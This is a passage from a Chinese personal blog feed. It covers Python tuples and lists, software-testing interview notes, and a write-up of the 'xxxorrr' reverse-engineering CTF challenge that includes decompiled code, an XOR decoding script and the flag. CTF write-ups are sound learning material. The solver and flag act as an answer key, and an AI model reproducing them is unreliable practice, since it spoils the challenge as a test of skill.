title="为何元组不可变"></a>为何元组不可变</h2><p>（1）多任务环境下，同时操作对象时不需要加锁</p><p>（2）元组中存储的是对象的引用：</p><pre><code class="hljs">* 若对象本身不可变，则不能再引用其他对象* 若对象是可变的，则可变对象的引用不允许改变，但数据可以变。</code></pre><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">t=<span class="hljs-selector-attr">[10,[20,30]</span>,<span class="hljs-number">90</span>]<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t)</span></span> #<span class="hljs-selector-attr">[10, [20, 30]</span>, <span class="hljs-number">90</span>]<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(t)</span></span>) #&lt;class <span class="hljs-string">'list'</span>&gt;<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t[<span class="hljs-number">0</span>],type(t[<span class="hljs-number">0</span>])</span></span>,<span class="hljs-built_in">id</span>(t<span class="hljs-selector-attr">[0]</span>)) #<span class="hljs-number">10</span> &lt;class <span class="hljs-string">'int'</span>&gt; <span class="hljs-number">2150843443792</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t[<span class="hljs-number">1</span>],type(t[<span class="hljs-number">1</span>])</span></span>,<span class="hljs-built_in">id</span>(t<span class="hljs-selector-attr">[1]</span>)) #<span class="hljs-selector-attr">[20, 30]</span> &lt;class <span class="hljs-string">'list'</span>&gt; <span class="hljs-number">2150955913664</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t[<span class="hljs-number">2</span>],type(t[<span class="hljs-number">2</span>])</span></span>,<span class="hljs-built_in">id</span>(t<span class="hljs-selector-attr">[2]</span>)) #<span class="hljs-number">90</span> &lt;class <span class="hljs-string">'int'</span>&gt; <span class="hljs-number">2150843634832</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(id(<span class="hljs-number">100</span>)</span></span>) #<span class="hljs-number">2150843635152</span><br> #由于<span class="hljs-selector-attr">[20,30]</span>列表，而列表是可变序列，所以可以向列中添加元素，而列表的内存地址不变<br>t<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-class">.append</span>(<span class="hljs-number">100</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(t,id(t[<span class="hljs-number">1</span>])</span></span>) #<span class="hljs-selector-attr">[10, [20, 30, 100]</span>, <span class="hljs-number">90</span>] <span class="hljs-number">2150952344704</span><br></code></pre></td></tr></tbody></table></figure><p>（3）元组遍历</p><p>元组可迭代，用<code>for…in…</code>遍历</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">t=tuple((<span class="hljs-string">'Python'</span>,<span class="hljs-string">'hello'</span>,<span class="hljs-number">90</span>))<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">item</span> <span class="hljs-keyword">in</span> t:<br>    print(<span class="hljs-keyword">item</span>)<br> <span class="hljs-comment">#Python</span><br> <span class="hljs-comment">#hello</span><br> <span class="hljs-comment">#90</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>软测面试准备</title>
    <link href="/2022/09/02/%E8%BD%AF%E6%B5%8B%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
    <url>/2022/09/02/%E8%BD%AF%E6%B5%8B%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/</url>
    
    <content type="html"><![CDATA[<h1 id="基本linux命令"><a href="#基本linux命令" class="headerlink" title="基本linux命令"></a>基本linux命令</h1><ul><li>file: 通过探测文件内容判断文件类型，使用权限是所有用户。<ul><li>-v 在标准输出后显示版本信息并退出</li><li>-z 探测压缩过的文件类型</li><li>-L 允许符合连接</li></ul></li><li>mkdir: 建立文件夹，使用权限是所有用户<ul><li>-m 设定权限</li><li>-p 创建上层目录</li><li>-v 创建新目录时显示信息，版本信息</li></ul></li><li>grep: 指定文件中搜索特定的内容，并将含有这些内容的行标准输出。格式：grep 参数<ul><li>-c 只输出匹配行的计数</li><li>-i 不区分大小写（只适用单字符）</li><li>-h 查询多文件时不显示文件名</li><li>-l 查询多文件时只输出包含匹配字符的文件名</li><li>-n 显示匹配及行号</li><li>-s 不显示不存在或无匹配文本的错误信息</li><li>-v 显示不包含匹配文本的所有行</li></ul></li><li>find: 在目录种搜索文件，权限为所有用户，格式：find [path] path指定目录路径，路径列表，互相用空格分离。</li><li>depth: 使用深度级别的查找过程方式，在某层指定目录种优先查找文件内容</li></ul><h1 id="数组和链表的区别及优缺点，如何结合两者优点"><a href="#数组和链表的区别及优缺点，如何结合两者优点" class="headerlink" title="数组和链表的区别及优缺点，如何结合两者优点"></a>数组和链表的区别及优缺点，如何结合两者优点</h1><p>1、数组</p><p>数组是将元素在内存中连续存放，由于每个元素占用内存相同，可以通过下标迅速访问数组中任何元素，但若在数组中增加一个元素，需要移动大量元素，在内存中空出一个元素的空间，然后将要将要增加的元素放入</p><p>2、链表</p><p>链表中的元素在内存中不是顺序存储，而是通过存在元素中的指针联系到一起，每个结点包括两个部分，存储数据元素的数据域，和存储下一个结点地址的指针。</p><p>若要访问链表中的一个元素，需要从第一个元素开始，一直找到需要的元素位置，但增删元素，只需修改元素中的指针即可。</p><p>3、区别</p><ul><li>存储位置：数组逻辑上相邻的元素在物理存储位置上也相邻，但链表不一定</li><li>存储空间：链表存放的内存空间可以连续也可以不连续，但数组是连续的一段内存空间。数组存放相同多的数据数组占用内存较小，但链表还需存放前驱和后继的空间。</li><li>长度可变性：链表长度按实际可伸缩，数组长度是定义固定的。</li><li>按序号查找：数组可随机访问，时间复杂度为O(1)，链表不支持随机访问，平均需要O(n)</li></ul><p>4、哈希表可以结合数组和链表的优点</p><h1 id="测试的相关流程"><a href="#测试的相关流程" class="headerlink" title="测试的相关流程"></a>测试的相关流程</h1><p>需求测试-概要设计测试-详细涉及测试-单元测试-集成测试-系统测试-验收测试</p><h1 id="如何写测试用例"><a href="#如何写测试用例" class="headerlink" title="如何写测试用例"></a>如何写测试用例</h1><p>1、测试员尽早介入，彻底理解清楚需求作为写测试用例的基础</p><p>2、若以前有类似的需求，可以参考类似需求的测试用例，还需要看类似需求的bug情况</p><p>3、清楚输入、输出的各种可能性，以及各种输入的之间的关联关系，理解清楚需求的执行逻辑，通过等价类、边界值、判定表等方法找出大部分用例。</p><p>4、找到需求相关的一些特性，补充测试用例</p><p>5、根据自己的经验分析遗漏的测试场景</p><p>6、多总结类似功能点的测试点</p><p>7、书写格式清晰</p><p>需求分析-需求评审-测试计划与评审-编写测试用例</p><h1 id="测试的常用方法"><a href="#测试的常用方法" class="headerlink" title="测试的常用方法"></a>测试的常用方法</h1><p>(1)黑盒测试方法：</p><p> 黑盒测试也称功能测试或数据驱动测试，它是在已知产品所应具有的功能，通过测试来检测每个功能是否都能正常使用，在测试时，把程序看作一个不能打开的黑盆子，在完全不考虑程序内部结构和内部特性的情况下，测试者在程序接口进行测试，它只检查程序功能是否按照需求规格说明书的规定正常使用，程序是否能适当地接收输入数锯而产生正确的输出信息，并且保持外部信息（如数据库或文件）的完整性。 “黑盒”法着眼于程序外部结构、不考虑内部逻辑结构、针对软件界面和软件功能进行测试。“黑盒”法是穷举输入测试，只有把所有可能的输入都作为测试情况使用，才能以这种方法查出程序中所有的错误。实际上测试情况有无穷多个，因此不仅要测试所有合法的输入，而且还要对那些不合法但是可能的输入进行测试</p><pre><code class="hljs">a)等价类划分法：将程序中所有可能的输入数据划分为若干个等价类，然后从每个部分中选取具有代表性的数据当作测试用例。测试用例由有效等价类和无效等价类的代表数据组成，从而保证测试用例具有完整性和代表性。b)边界值分析法：对程序输入或输出的边界值进行测试（恰好处于边界、或超过边界、或在边界以下的状态）c)因果图法：一种简化逻辑图，能够直观表明输入条件和输出动作之间的因果关系，适合于描述对于多种输入条件组合的测试方法，根据输入条件的组、约束关系和输出条件的因果关系，分析输入条件的各种组合情况，从而设计测试用例的方法，适合于检查程序输入条件的各种组合情况d)错误推测法：基于以往的经验和直觉，参照以往的软件系统出现的错误，推测当前被测程序中可能存在的缺陷和错误，有针对性地设计测试用例，列举出程序中可能犯的错误或容易发生错误的特殊情况的清单，根据清单和已经设计好的测试用例来编写特定的测试用例，站在用户的角度来考虑输入信息，而不必去管这些信息对于被测程序是否是合理的输入。</code></pre><p>(2)白盒测试方法：</p><p>白盒测试也称为结构测试或逻辑驱动测试，是针对被测单元内部是如何进行工作的测试。它根据程序的控制结构设计测试用例，主要用于软件或程序验证。白盒测试法检查程序内部逻辑结构，对所有的逻辑路径进行测试，是一种穷举路径的测试方法，但即使每条路径都测试过了，但仍然有可能存在错误。因为：穷举路径测试无法检查出程序本身是否违反了设计规范，即程序是否是一个错误的程序；穷举路径测试不可能检查出程序因为遗漏路径而出错；穷举路径测试发现不了一些与数据相关的错误。 白盒测试需要遵循的原则有：1. 保证一个模块中的所有独立路径至少被测试一次；2. 所有逻辑值均需要测试真（true）和假（false）；两种情况；3. 检查程序的内部数据结构，保证其结构的有效性；4. 在上下边界及可操作范围内运行所有循环。</p><pre><code class="hljs">a)静态分析：不通过执行程序而进行测试的技术，关键功能是检查软件的表示和描述是否一致，没有冲突或者没有歧义。b)动态分析：其主要特点是当软件系统在模拟的或真实的环境中执行之前、之中和之后，对软件系统行为的分析。动态分析包含了程序在受控的环境下使用特定的期望结果进行正式的运行。它显示了一个系统在检查状态下是正确还是不正确。    i.语句覆盖：顾名思义就是针对代码语句，设计出来的用例要保证程序中的每一个语句至少被执行一次。    ii.分支覆盖：使得程序中每个判断的取真和取假至少经历一次，即判断的真假均曾被满足。    iii.条件覆盖：要求设计用例时针对判断语句里面每个条件表达式true 和 false各取值一次，不考判断语句的计算结果（不考虑组合情况）。    iv.判定条件覆盖：设计测试用例时，使得判断语句中每个条件表达式的所有可能结果至少出现一次，每个判断语句本身所有可能结果也至少出现一次。    v.组合覆盖：设计测试用例时，使得每个判断语句中条件结果的所有可能组合至少出现一次。    vi.路径覆盖：设计测试用例时，覆盖程序中所有可能的执行路径</code></pre><h1 id="说出几种基本的数据结构"><a href="#说出几种基本的数据结构" class="headerlink" title="说出几种基本的数据结构"></a>说出几种基本的数据结构</h1><p>1、链表</p><p>是一种物理存储单元上非连续、非顺序的存储结构，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。由一系列节点组成，节点不必在内存中相连，每个节点由数据部分Data和链部分Next，Next指向下一个节点，这样当添加或者删除时，只需要改变相关节点的Next的指向，效率很高。</p><p>2、栈和队列</p><p>是比较特殊的线性表，栈是限制插入和删除只能在一个位置上进行的表，后进先出。</p><p>队列只允许在front端进行删除操作，在rear端进行插入操作。</p><p>3、树</p><p>树形结构是一类非常重要的非线性数据结构，考察主要以二叉树为主</p><h1 id="了解什么测试方法"><a href="#了解什么测试方法" class="headerlink" title="了解什么测试方法"></a>了解什么测试方法</h1><p>等价类划分，边界值分析，错误推测，因果图法，逻辑覆盖法，程序插桩技术，基本路径法，符号测试，错误驱动测试</p><h1 id="设计一个微信朋友圈点赞的测试用例"><a href="#设计一个微信朋友圈点赞的测试用例" class="headerlink" title="设计一个微信朋友圈点赞的测试用例"></a>设计一个微信朋友圈点赞的测试用例</h1><p>功能测试：点赞某条朋友圈，验证是否成功</p><p>接口测试：点赞朋友圈，验证朋友能否收到提示信息</p><p>性能测试：点赞朋友圈，是否在规定时间显示结果，是否在规定时间在朋友手机上进行提示</p><p>兼容性测试：在不同的终端手机上点赞朋友圈验证是否成功</p><h1 id="HTTP报文段是什么样的"><a href="#HTTP报文段是什么样的" class="headerlink" title="HTTP报文段是什么样的"></a>HTTP报文段是什么样的</h1><p>http报文是面向文本，每一个字段都是ASCII码串，每个字段长度不确定，</p><p>1、请求报文：</p><p>请求行：request line,由请求方法字段、url字段和http协议版本字段三个字段组成，空格分隔。</p><p>请求方法：</p><ul><li>GET: 要求服务器将url定位的资源放在响应报文的数据部分，回送给客户端，传参长度受限制，请求数据以地址形式表现在请求行。</li><li>POST: 允许客户端向服务器提供较多信息，将请求参数封装在http请求数据中，以名称/值的形式出现，可传输大量数据，也不会显示在url中。</li><li>HEAD: 服务端接受head请求后只返回响应头而不会发送相应内容。</li></ul><p>2、URL</p><p>url: 同意资源定位符，是一种资源位置的抽象唯一识别方法，由子集URL和URN组成，<code>&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt;</code></p><p>3、协议版本</p><p>格式为HTTP/主版本号.次版本号，常用为：HTTP/1.1 HTTP/1.0</p><p>4、请求头部</p><ul><li>Host: 接受请求的服务器地址，IP或者域名</li><li>User-Agent：发送请求的应用名称</li><li>Connection: 指定与连接相关的属性</li><li>Accept-Charset: 通知服务器端可以发送的编码格式</li><li>Accept-Encoding: 通知服务器端可以发送的数据压缩格式</li><li>Accept-Language: 通知服务器端可以发送的语言</li></ul><p>请求行：包含请求方式（get、post、put等）、URL，Http协议版本；</p><p>请求头：包含主机host，请求时间，客户端类型、指定客户端接收的数据格式，客户端支持的语言等</p><p>请求体：包含post方法提交的数据，也可以为空； </p><p>响应行：包含状态码、响应信息、Http协议版本； </p><p>响应头：包含响应时间，响应数据的长度、类型、字符编码等</p><p>响应体：包含页面源码；</p><h1 id="压力测试"><a href="#压力测试" class="headerlink" title="压力测试"></a>压力测试</h1><p>对系统不断施加册立，通过确定一个系统的瓶颈或者不能接收的性能点，来获得系统能提供的最大服务级别的测试。</p><h1 id="tcp-udp-区别"><a href="#tcp-udp-区别" class="headerlink" title="tcp udp 区别"></a>tcp udp 区别</h1><p>1、tcp面向连接（先建立连接再发送数据）</p><p>udp无连接，发送数据钱不需要建立连接</p><p>2、tcp安全可靠，传送的数据无差错不丢失不重复且按序到达；</p><p>udp尽最大努力交付，但是不保证可靠交付</p><p>3、tcp面向字节流,把数据看成一连串无结构的字节流;</p><p>UDP是面向报文的，应用层交给UDP多长的报文，UDP就照样发送，即一次发送一个报文</p><p>4、每一条TCP连接只能是点到点的;UDP支持一对一，一对多，多对一和多对多的交互通信 </p><p>5、TCP的逻辑通信信道是全双工的可靠信道，UDP则是不可靠信道</p><h1 id="介绍一下单元测试、集成测试、系统测试、验收测试、回归测试"><a href="#介绍一下单元测试、集成测试、系统测试、验收测试、回归测试" class="headerlink" title="介绍一下单元测试、集成测试、系统测试、验收测试、回归测试"></a>介绍一下单元测试、集成测试、系统测试、验收测试、回归测试</h1><p>1、单元测试：</p><p>完成最小的软件设计单元（模块）的验证工作，目标是确保模块被正确的编码，使用过程设计描述作为指南，对重要的控制路径进行测试以发现模块内的错误，通常情况下是白盒的，对代码风格和规则、程序设计和结构、业务逻辑等进行静态测试，及早的发现和解决不易显现的错误。 </p><p>2、集成测试：</p><p>通过测试发现与模块接口有关的问题。目标是把通过了单元测试的模块拿来，构造一个在设计中所描述的程序结构，应当避免一次性的集成（除非软件规模很小），而采用增量集成。 自顶向下集成：模块集成的顺序是首先集成主模块，然后按照控制层次结构向下进行集成，隶属于主模块的模块按照深度优先或广度优先的方式集成到整个结构中去。 自底向上集成：从原子模块开始来进行构造和测试，因为模块是自底向上集成的，进行时要求所有隶属于某个给顶层次的模块总是存在的，也不再有使用稳定测试桩的必要。 </p><p>3、系统测试：</p><p>是基于系统整体需求说明书的黑盒类测试，应覆盖系统所有联合的部件。系统测试是针对整个产品系统进行的测试，目的是验证系统是否满足了需求规格的定义，找出与需求规格不相符合或与之矛盾的地方。系统测试的对象不仅仅包括需要测试的产品系统的软件，还要包含软件所依赖的硬件、外设甚至包括某些数据、某些支持软件及其接口等。因此，必须将系统中的软件与各种依赖的资源结合起来，在系统实际运行环境下来进行测试。 </p><p>4、回归测试：</p><p>回归测试是指在发生修改之后重新测试先前的测试用例以保证修改的正确性。理论上，软件产生新版本，都需要进行回归测试，验证以前发现和修复的错误是否在新软件版本上再次出现。根据修复好了的缺陷再重新进行测试。回归测试的目的在于验证以前出现过但已经修复好的缺陷不再重新出现。一般指对某已知修正的缺陷再次围绕它原来出现时的步骤重新测试。 </p><p>5、验收测试：</p><p>验收测试是指系统开发生命周期方法论的一个阶段，这时相关的用户或独立测试人员根据测试计划和结果对系统进行测试和接收。它让系统用户决定是否接收系统。它是一项确定产品是否能够满足合同或用户所规定需求的测试。验收测试包括Alpha测试和Beta测试。 Alpha测试：是由用户在开发者的场所来进行的，在一个受控的环境中进行。 Beta测试：由软件的最终用户在一个或多个用户场所来进行的，开发者通常不在现场，用户记录测试中遇到的问题并报告给开发者，开发者对系统进行最后的修改，并开始准备发布最终的软件。</p><h1 id="tcp的三次握手"><a href="#tcp的三次握手" class="headerlink" title="tcp的三次握手"></a>tcp的三次握手</h1>]]></content>
    
    
    
    <tags>
      
      <tag>软件测试，面试准备</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界RE-xxxorrr</title>
    <link href="/2022/08/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-xxxorrr/"/>
    <url>/2022/08/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-xxxorrr/</url>
    
    <content type="html"><![CDATA[<p>xor 异或逻辑运算：相同为0，不同为1</p><p>ida64打开，找到关键字符串<code>Congratulations</code>,点进去查看伪代码</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 <span class="hljs-title">sub_916</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  __int64 v1; <span class="hljs-comment">// [sp+8h] [bp-8h]@1</span><br>  v1 = *<span class="hljs-built_in">MK_FP</span>(__FS__, <span class="hljs-number">40LL</span>);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, s2) )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congratulations!"</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Wrong!"</span>);<br>  <span class="hljs-keyword">return</span> *<span class="hljs-built_in">MK_FP</span>(__FS__, <span class="hljs-number">40LL</span>) ^ v1;<br>}<br></code></pre></td></tr></tbody></table></figure><p>s1与s2相同，返回<code>Congratulations!</code></p><p><img src="https://s2.loli.net/2022/08/19/friaOguYG85KUyh.png" alt="图片.png"></p><p>查看s1,s2值：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s1</span>=qasxcytgsasxcvrefghnrfghnjedfgbhn<br><span class="hljs-attribute">s2</span>= <span class="hljs-number">0</span>x56, <span class="hljs-number">0</span>x4E, <span class="hljs-number">0</span>x57, <span class="hljs-number">0</span>x58, <span class="hljs-number">0</span>x51, <span class="hljs-number">0</span>x51, <span class="hljs-number">0</span>x09, <span class="hljs-number">0</span>x46, <span class="hljs-number">0</span>x17, <span class="hljs-number">0</span>x46, <span class="hljs-number">0</span>x54, <span class="hljs-number">0</span>x5A, <span class="hljs-number">0</span>x59, <span class="hljs-number">0</span>x59, <span class="hljs-number">0</span>x1F, <span class="hljs-number">0</span>x48, <span class="hljs-number">0</span>x32, <span class="hljs-number">0</span>x5B, <span class="hljs-number">0</span>x6B, <span class="hljs-number">0</span>x7C, <span class="hljs-number">0</span>x75, <span class="hljs-number">0</span>x6E, <span class="hljs-number">0</span>x7E, <span class="hljs-number">0</span>x6E, <span class="hljs-number">0</span>x2F, <span class="hljs-number">0</span>x77, <span class="hljs-number">0</span>x4F, <span class="hljs-number">0</span>x7A, <span class="hljs-number">0</span>x71, <span class="hljs-number">0</span>x43, <span class="hljs-number">0</span>x2B, <span class="hljs-number">0</span>x26, <span class="hljs-number">0</span>x89, <span class="hljs-number">0</span>xFE, <span class="hljs-number">0</span>x00<br></code></pre></td></tr></tbody></table></figure><p>查看main函数伪代码：</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">__int64 __fastcall main(__int64 a1, <span class="hljs-built_in">char</span> **a2, <span class="hljs-built_in">char</span> **a3)<br>{<br>  __int64 result; <span class="hljs-comment">// rax@4</span><br>  __int64 v4; <span class="hljs-comment">// rsi@4</span><br>  signed <span class="hljs-built_in">int</span> i; <span class="hljs-comment">// [sp+Ch] [bp-34h]@1</span><br>  <span class="hljs-built_in">char</span> s<span class="hljs-literal">[<span class="hljs-number">40</span>]</span>; <span class="hljs-comment">// [sp+10h] [bp-30h]@1</span><br>  __int64 v7; <span class="hljs-comment">// [sp+38h] [bp-8h]@1</span><br>  v7 = *<span class="hljs-constructor">MK_FP(<span class="hljs-params">__FS__</span>, 40LL)</span>;    <span class="hljs-comment">// v7 8字节，我也不知道啥功能</span><br>  sub<span class="hljs-constructor">_A90((<span class="hljs-params">__int64</span>)</span>sub_916);<br>  fgets(s, <span class="hljs-number">35</span>, stdin);          <span class="hljs-comment">// 从stdin中读取35个存储到s</span><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">33</span>; ++i )<br>    s1<span class="hljs-literal">[(<span class="hljs-identifier">signed</span> <span class="hljs-identifier">__int64</span>)<span class="hljs-identifier">i</span>]</span> ^= s<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>;  <span class="hljs-comment">// s1和s异或，值传给s1</span><br>  result = <span class="hljs-number">0L</span>L;<br>  v4 = *<span class="hljs-constructor">MK_FP(<span class="hljs-params">__FS__</span>, 40LL)</span> ^ v7;<br>  return result;<br>}<br></code></pre></td></tr></tbody></table></figure><p>不知道这玩意儿啥意思，看一下main流程图吧：</p><p><img src="https://s2.loli.net/2022/08/19/iDpxFBfYdAgG9Qj.png" alt="图片.png"></p><p>s1和s2异或，然后跟s比较，一样就Congratulations，</p><p>那就s1和s2异或一下呗。</p><p>但还是不行，查看了一下官方wp,发现还有另一个异或，没找到，很迷，先贴一下官方exp吧。</p><p>exp:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s2</span>=[ <span class="hljs-number">0</span>x56, <span class="hljs-number">0</span>x4E, <span class="hljs-number">0</span>x57, <span class="hljs-number">0</span>x58, <span class="hljs-number">0</span>x51, <span class="hljs-number">0</span>x51, <span class="hljs-number">0</span>x09, <span class="hljs-number">0</span>x46, <span class="hljs-number">0</span>x17, <span class="hljs-number">0</span>x46, <br>  <span class="hljs-attribute">0x54</span>, <span class="hljs-number">0</span>x5A, <span class="hljs-number">0</span>x59, <span class="hljs-number">0</span>x59, <span class="hljs-number">0</span>x1F, <span class="hljs-number">0</span>x48, <span class="hljs-number">0</span>x32, <span class="hljs-number">0</span>x5B, <span class="hljs-number">0</span>x6B, <span class="hljs-number">0</span>x7C, <br>  <span class="hljs-attribute">0x75</span>, <span class="hljs-number">0</span>x6E, <span class="hljs-number">0</span>x7E, <span class="hljs-number">0</span>x6E, <span class="hljs-number">0</span>x2F, <span class="hljs-number">0</span>x77, <span class="hljs-number">0</span>x4F, <span class="hljs-number">0</span>x7A, <span class="hljs-number">0</span>x71, <span class="hljs-number">0</span>x43, <br>  <span class="hljs-attribute">0x2B</span>, <span class="hljs-number">0</span>x26, <span class="hljs-number">0</span>x89, <span class="hljs-number">0</span>xFE, <span class="hljs-number">0</span>x00]<br><span class="hljs-attribute">s1</span> = 'qasxcytgsasxcvrefghnrfghnjedfgbhn'<br><span class="hljs-attribute">print</span>(len(s1))<br><span class="hljs-attribute">for</span> i in range(len(s1)+<span class="hljs-number">1</span>):<br> <span class="hljs-attribute">print</span>(chr(ord(s1[i])^ (<span class="hljs-number">2</span> * i + <span class="hljs-number">65</span>)^s2[i]),end='')<br> <span class="hljs-comment"># flag{c0n5truct0r5_functi0n_in_41f}</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>RE</tag>
      
      <tag>CTF</tag>
      
      <tag>攻防世界</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习3</title>
    <link href="/2022/08/18/python%E5%AD%A6%E4%B9%A03/"/>
    <url>/2022/08/18/python%E5%AD%A6%E4%B9%A03/</url>
    
    <content type="html"><![CDATA[<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>变量可以存储一个元素，而列表是可以存储多个元素，程序可以方便的对这些数据进行整体操作。</p><p>（相当于数组）</p><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">a</span>=10<br>list=[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span>,98]<br><span class="hljs-built_in">print</span>(id(list)) # 2957481570240<br><span class="hljs-built_in">print</span>(type(list)) # &lt;class <span class="hljs-string">'list'</span>&gt;<br><span class="hljs-built_in">print</span>(list) # [<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>, 98]<br></code></pre></td></tr></tbody></table></figure><h2 id="创建列表"><a href="#创建列表" class="headerlink" title="创建列表"></a>创建列表</h2><p>1、使用中括号[]，英文逗号分隔，调用内置函数list()</p><p>2、特点：</p><ul><li>有序排序</li><li>索引映射唯一一个数据</li><li>可存储重复数据</li><li>任意数据类型混存</li><li>根据需要动态分配和回收内存</li></ul><p>eg:</p><figure class="highlight prolog"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs prolog">list=[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span>,<span class="hljs-number">98</span>] <br>print(list) # [<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-number">98</span>]<br>print(list[<span class="hljs-number">0</span>],list[<span class="hljs-number">-3</span>]) # hello hello<br></code></pre></td></tr></tbody></table></figure><h2 id="列表查询"><a href="#列表查询" class="headerlink" title="列表查询"></a>列表查询</h2><h3 id="获取指定元素索引-index"><a href="#获取指定元素索引-index" class="headerlink" title="获取指定元素索引 index()"></a>获取指定元素索引 <code>index()</code></h3><ul><li>列表中有相同元素，只返回第一个元素的索引</li><li>查询元素不存在返回error</li><li>可指定范围</li></ul><p>eg:</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">list=<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span>,98,<span class="hljs-string">'hello'</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list.index(<span class="hljs-string">'hello'</span>)</span></span>) #<span class="hljs-number">0</span><br> <span class="hljs-selector-id">#print</span>(list<span class="hljs-selector-class">.index</span>(<span class="hljs-string">'hello'</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)) #<span class="hljs-string">'world'</span>,<span class="hljs-number">98</span>,范围内无<span class="hljs-string">'hello'</span>，返回error<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list.index(<span class="hljs-string">'hello'</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>)</span></span>) #<span class="hljs-number">3</span><br></code></pre></td></tr></tbody></table></figure><h3 id="获取列表中的单个元素"><a href="#获取列表中的单个元素" class="headerlink" title="获取列表中的单个元素"></a>获取列表中的单个元素</h3><ul><li>正向，从0到n-1，eg:<code>list[0]</code></li><li>逆向，从-n到-1，eg:<code>list[-n]</code></li><li>不存在，error</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">list=<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span>,98,<span class="hljs-string">'hello'</span>,324]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list[<span class="hljs-number">2</span>])</span></span> #<span class="hljs-number">98</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list[-<span class="hljs-number">3</span>])</span></span> #<span class="hljs-number">98</span><br> <span class="hljs-selector-id">#print</span>(list<span class="hljs-selector-attr">[-8]</span>) #error<br></code></pre></td></tr></tbody></table></figure><h3 id="获取列表中的多个元素"><a 